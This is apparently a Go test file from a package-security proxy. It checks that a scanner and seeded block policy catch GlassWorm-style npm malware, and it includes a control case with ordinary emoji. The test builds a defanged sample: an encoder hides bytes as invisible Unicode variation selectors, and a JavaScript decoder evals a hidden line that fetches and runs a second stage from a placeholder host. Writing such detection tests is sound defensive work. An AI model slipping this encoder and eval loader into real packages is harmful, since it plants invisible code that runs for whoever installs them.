package config

// Attack 2026 #06 — GlassWorm March wave (2026-03-03..18).
//
// Shape (Aikido, "Glassworm Returns", 2026-03-13): a JS file carries a
// decoder plus a backtick string that LOOKS empty but holds one Unicode
// variation selector per payload byte (byte<16 -> U+FE00+b, else
// U+E0100+b-16), then `eval(Buffer.from(s(`…`)).toString('utf-8'))`. The same
// decoder appeared in npm packages (@aifabrix/miso-client@4.7.2,
// @iflow-mcp/watercrawl-watercrawl-mcp@1.3.x) uploaded 2026-03-12.
//
// This test drives the proxy path's two real pieces: hiddenunicode.Scan (what
// internal/server/artifact_inspection.go runs inline on the first download,
// before policy evaluation) and the full seeded policy set from
// configs/seed.yaml evaluated by policy.Evaluator — the rules every NEW org
// inherits (core/policy/seed.go).

import (
	"strings"
	"testing"
	"time"

	"github.com/chain305/chainsaw-core/hiddenunicode"
	"github.com/chain305/chainsaw-core/policy"
)

// glassWormEncode is the GlassWorm byte->variation-selector encoding.
func glassWormEncode(payload string) string {
	var b strings.Builder
	for _, c := range []byte(payload) {
		if c < 16 {
			b.WriteRune(rune(0xFE00 + int(c)))
		} else {
			b.WriteRune(rune(0xE0100 + int(c) - 16))
		}
	}
	return b.String()
}

// glassWormIndexJS is a defanged reproduction of the decoder + hidden payload.
func glassWormIndexJS() string {
	hidden := glassWormEncode(`fetch("https://c2.example.invalid/stage2").then(r=>r.text()).then(eval)`)
	return "const s = v => [...v].map(w => (w = w.codePointAt(0), w >= 0xFE00 && w <= 0xFE0F ? w - 0xFE00 : w >= 0xE0100 && w <= 0xE01EF ? w - 0xE0100 + 16 : null)).filter(n => n !== null);\n" +
		"eval(Buffer.from(s(`" + hidden + "`)).toString('utf-8'));\n" +
		"module.exports = { ok: true };\n"
}

func TestAttack2026_06_GlassWormVariationSelectors(t *testing.T) {
	requireMonorepoTree(t, "configs")
	cfg, err := Load(seedConfigPaths[0])
	if err != nil {
		t.Fatalf("load seed: %v", err)
	}
	if len(cfg.Policies) == 0 {
		t.Fatal("seed carries no policies — DID NOT RUN")
	}
	seeded := make([]policy.Policy, 0, len(cfg.Policies))
	for i, p := range cfg.Policies {
		if p.ID == "" {
			p.ID = p.Name
		}
		if p.Precedence == 0 {
			p.Precedence = i + 1
		}
		p.CreatedAt = time.Now()
		seeded = append(seeded, p)
	}
	store, _ := policy.NewStore(nil)
	eval := policy.NewEvaluator(store)

	evaluate := func(files map[string][]byte) (hiddenunicode.Result, policy.EvaluationResult) {
		res := hiddenunicode.Scan(files)
		ctx := policy.EvaluationContext{
			Repository:     "npmjs",
			PackageName:    "@aifabrix/miso-client",
			PackageVersion: "4.7.2",
			// Same derivation as mergeArtifactSignals
			// (internal/server/artifact_inspection.go).
			HasHiddenUnicode:   res.Hits >= hiddenunicode.Threshold() && res.Hits > 0,
			HiddenUnicodeKinds: res.Kinds,
		}
		return res, eval.EvaluateWithPolicies(ctx, seeded, 0)
	}

	t.Run("attack: variation-selector payload is refused by the seeded block rule", func(t *testing.T) {
		res, out := evaluate(map[string][]byte{
			"package/package.json": []byte(`{"name":"@aifabrix/miso-client","version":"4.7.2","main":"index.js"}`),
			"package/index.js":     []byte(glassWormIndexJS()),
		})
		if got := res.KindHits[hiddenunicode.KindVariationSelector]; got < 60 {
			t.Fatalf("variation_selector hits = %d (kinds %v), want the whole payload run", got, res.Kinds)
		}
		if out.Action != policy.ModeBlock {
			t.Fatalf("seeded policy action = %s (%s), want block", out.Action, out.Reason)
		}
		if out.MatchedPolicy == nil || out.MatchedPolicy.Name != "Block bidi-override hidden Unicode payloads" {
			t.Fatalf("matched policy = %+v, want the seeded hidden-unicode block rule", out.MatchedPolicy)
		}
	})

	// Seeding dedups by NAME (core/policy/seed.go seedPolicies), so an org
	// seeded before v0.22.99 keeps the old row whose kinds are
	// ["bidi_override"] only. Pin that this row does NOT refuse GlassWorm:
	// it is the limitation, and it proves the test above depends on the
	// rule's kinds rather than on any hidden-unicode hit.
	t.Run("limitation: pre-v0.22.99 seeded row (bidi_override only) does not refuse", func(t *testing.T) {
		old := make([]policy.Policy, len(seeded))
		copy(old, seeded)
		found := false
		for i := range old {
			if old[i].Name == "Block bidi-override hidden Unicode payloads" {
				old[i].Conditions.HiddenUnicodeKinds = []string{"bidi_override"}
				found = true
			}
		}
		if !found {
			t.Fatal("seeded hidden-unicode block rule missing")
		}
		res := hiddenunicode.Scan(map[string][]byte{"package/index.js": []byte(glassWormIndexJS())})
		out := eval.EvaluateWithPolicies(policy.EvaluationContext{
			Repository: "npmjs", PackageName: "@aifabrix/miso-client", PackageVersion: "4.7.2",
			HasHiddenUnicode: res.Hits > 0, HiddenUnicodeKinds: res.Kinds,
		}, old, 0)
		if out.Action == policy.ModeBlock {
			t.Fatalf("old bidi-only row blocked (%s) — limitation no longer holds; update the attack-evidence record", out.Reason)
		}
	})

	t.Run("control: emoji presentation selectors are not a payload", func(t *testing.T) {
		res, out := evaluate(map[string][]byte{
			"package/package.json": []byte(`{"name":"emoji-ok","version":"1.0.0"}`),
			"package/README.md":    []byte("Status: ❤️ shipped ✔️ keycap 1️⃣ and ☺︎ text style\n"),
			"package/index.js":     []byte("module.exports = '✅ done ❤️';\n"),
		})
		if got := res.KindHits[hiddenunicode.KindVariationSelector]; got != 0 {
			t.Fatalf("benign emoji produced %d variation_selector hits", got)
		}
		if out.Action == policy.ModeBlock {
			t.Fatalf("benign emoji package blocked: %s", out.Reason)
		}
	})
}
